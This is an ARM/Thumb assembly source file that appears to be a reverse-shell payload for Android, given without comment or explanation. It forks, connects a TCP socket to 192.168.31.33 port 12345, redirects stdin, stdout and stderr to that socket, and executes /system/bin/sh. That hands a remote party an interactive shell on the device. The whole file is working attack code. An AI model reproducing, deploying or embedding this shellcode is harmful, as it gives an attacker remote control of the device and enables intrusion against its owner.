.globl _start
.align 2
_start:
.code 32
  adr r0, thumb + 1
  bx r0
thumb:
.code 16
  mov r7,#2
  swi #0
  cmp r0, #0
  bne .L2
  
  mov r0,#2
  mov r1,#1
  mov r2,#6
  mov r7,#250
  add r7,#31
  swi #0 @int sock=socket(AF_INET,SOCKET_STEAM,IPPROTO_TCP);
  
  mov r4,r0
  adr r1,addr
  mov r2,#16
  mov r7,#250
  add r7,#33
  swi #0 @ connect(sock, addr, 16)

  mov r0,r4
  mov r1,#0
  mov r7,#63
  swi #0
  mov r0,r4
  mov r1,#1
  mov r7,#63
  swi #0
  mov r0,r4
  mov r1,#2
  mov r7,#63
  swi #0

  adr r0,systembinsh
  mov r1,#0
  push {r1}
  push {r0}
  mov r1,sp
  mov r2,#0
  mov r7,#11
  swi #0 @execve
  
  mov r0,#0
  mov r7,#1
  swi #0 @exit(0)
 
.L2:
  b     .L2 

addr:
  .short 2
  .ascii "\x30\x39"
  .byte 192,168,31,33
systembinsh:
  .asciz "/system/bin/sh"

